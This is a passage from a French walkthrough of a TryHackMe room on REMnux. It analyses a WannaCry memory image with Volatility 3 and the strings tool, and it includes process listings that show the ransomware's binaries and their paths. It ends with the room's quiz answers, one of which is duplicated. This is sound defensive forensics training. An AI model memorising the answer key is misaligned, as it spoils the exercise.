596	csrss.exe	C:\WINDOWS\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16
620	winlogon.exe	winlogon.exe
664	services.exe	C:\WINDOWS\system32\services.exe
676	lsass.exe	C:\WINDOWS\system32\lsass.exe
836	svchost.exe	C:\WINDOWS\system32\svchost -k DcomLaunch
904	svchost.exe	C:\WINDOWS\system32\svchost -k rpcss
1024	svchost.exe	C:\WINDOWS\System32\svchost.exe -k netsvcs
1084	svchost.exe	C:\WINDOWS\system32\svchost.exe -k NetworkService
1152	svchost.exe	C:\WINDOWS\system32\svchost.exe -k LocalService
1484	spoolsv.exe	C:\WINDOWS\system32\spoolsv.exe
1636	explorer.exe	C:\WINDOWS\Explorer.EXE
1940	tasksche.exe	"C:\Intel\ivecuqmanpnirkt615\tasksche.exe" 
1956	ctfmon.exe	"C:\WINDOWS\system32\ctfmon.exe" 
260	svchost.exe	C:\WINDOWS\system32\svchost.exe -k LocalService
740	@WanaDecryptor@	@WanaDecryptor@.exe
1768	wuauclt.exe	"C:\WINDOWS\system32\wuauclt.exe" /RunStoreAsComServer Local\[400]SUSDS81a6658cb72fa845814e75cca9a42bf2
544	alg.exe	C:\WINDOWS\System32\alg.exe
1168	wscntfy.exe	C:\WINDOWS\system32\wscntfy.exe
```

#### FileScan

Ce plugin analyse une image mémoire Windows spécifique à la recherche d'objets de type fichier. Les résultats contiennent plus de 1 400 lignes.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.filescan.FileScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

Résultat **trop long pour l'afficher**

#### DllList

Ce plugin liste les modules chargés dans une image mémoire Windows donnée. En raison d'une limitation de texte, il ne comporte pas d'icône « Afficher les résultats ».

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.dlllist.DllList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

#### PsScan

Ce plugin permet de rechercher les processus présents dans une image mémoire Windows spécifique.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.psscan.PsScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished
```

#### Malfind

Ce plugin permet de lister les plages de mémoire des processus susceptibles de contenir du code injecté. Aucune icône « Afficher les résultats » ne sera disponible pour celui-ci en raison de la limitation du nombre de caractères.

Pour plus d'informations concernant les autres plugins, vous pouvez consulter [ce lien](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).

Vous avez maintenant exécuté les plugins individuellement et visualisez les résultats. L'étape suivante consiste à traiter ces données par lots. N'oubliez pas que l'une des pratiques d'enquête implique le prétraitement des preuves et l'enregistrement des résultats dans des fichiers texte, n'est-ce pas ? La question est : comment ?

La réponse ? Utilisez une boucle ! Voir la commande ci-dessous.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Analysons cette commande.

- Nous avons créé une variable nommée `$plugin` contenant les valeurs de chaque plugin Volatility.

- Ensuite, nous avons exécuté `vol3 parameters -q`, qui active le mode silencieux (sans affichage de la progression dans le terminal).

- Et `-f`, qui active la lecture de la capture mémoire.

- La commande `plugin>wcry.plugin.done;` exécute Volatility avec les plugins et enregistre le résultat dans un fichier dont le nom commence par `wcry`, suivi du nom du plugin et de l'extension `.txt`. Répétez l'opération jusqu'à ce que toutes les valeurs de la variable `$plugin` soient utilisées.

Après avoir exécuté la commande, vous ne verrez aucun résultat dans le terminal; vous verrez des fichiers dans le même répertoire que celui où vous avez exécuté la commande.

![volatility](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727001460357.png)

#### Prétraitement avec la commande `strings`

Nous allons maintenant prétraiter l'image mémoire à l'aide de l'utilitaire `strings` de Linux. Nous extrairons les **chaînes ASCII**, little-endian (16 bits) et big-endian (16 bits). Voir la commande ci-dessous.

```bash
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
root@10.10.214.227:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
```

La commande `strings` extrait du texte ASCII imprimable. L'option `-e l` indique à `strings` d'extraire des chaînes 16 bits en little-endian. L'option `-e b` indique à `strings` d'extraire des chaînes 16 bits en big-endian. Ces trois formats de chaînes peuvent fournir des informations utiles sur le système étudié.

Vous devriez obtenir le même résultat que ci-dessous.

![strings](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e6bbe59a46ee9407fd65bbe/room-content/5e6bbe59a46ee9407fd65bbe-1727002235999.png)

---

**What plugin lists processes in a tree based on their parent process ID?**

**Réponse :** `PsTree`

**What plugin is used to list all currently active processes in the machine?**

**Réponse :** `PsList`

**What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?**

**Réponse :** `strings`

**By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?**

**Réponse :** `csrss.exe`

**Continuing from the previous question (Question 4), what is the second (2nd) process identified suspected of having an injected code?**

**Réponse :** `winlogon.exe`

**Continuing from the previous question (Question 4), what is the second (2nd) process identified suspected of having an injected code?**

**Réponse :** `winlogon.exe`

**By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?**

**Réponse :** `C:\Intel\ivecuqmanpnirkt615`

### Task 6 - Conclusion

Dans cette salle, nous avons eu une introduction pratique à la machine virtuelle REMnux, où nous avons pu utiliser des outils comme oledump.py pour l'analyse de fichiers. Nous avons également créé un réseau virtuel avec INetSim et prétraité une capture mémoire à l'aide de volatility et strings. Tous ces outils sont intégrés à la machine virtuelle REMnux ! Cependant, nous n'avons pas encore exploré toutes ses fonctionnalités, car nous pourrions créer des salles dédiées pour permettre à chacun d'apprendre et de se familiariser avec elle.

**Room Complétée**

{% include comments.html %}